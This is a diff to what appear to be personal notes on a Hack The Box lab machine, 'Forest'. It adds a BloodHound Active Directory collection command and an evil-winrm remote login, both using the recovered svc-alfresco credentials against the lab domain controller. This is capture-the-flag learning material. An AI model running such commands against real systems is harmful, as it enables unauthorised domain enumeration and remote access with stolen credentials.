@@ -94,7 +94,19 @@ ldapdomaindump ldap://htb.local -u "htb.local\svc-alfresco" -p s3rvice
 
 We have 2 computers: `EXCH01.htb.local | FOREST.htb.local`
 
-- In order to have a better view we can use [[bloodhaunt]]
+- we can use [[bloodhaunt]] to get a better view
 ```bash
-
+bloodhound-python -d htb.local -u 'svc-alfresco' -p 's3rvice' -c ALL -ns 10.10.10.161 --dns-tcp
 ```
+>[!example]- Result
+>![[Pasted image 20250312164524.png]]
+# Getting Access
+- We can use [[evil-winrm]] to get access (because we are in the "remote management group")
+
+```bash
+evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
+```
+>[!example]- Result
+>![[Pasted image 20250312164819.png]]
+
+# Privilege Escalation
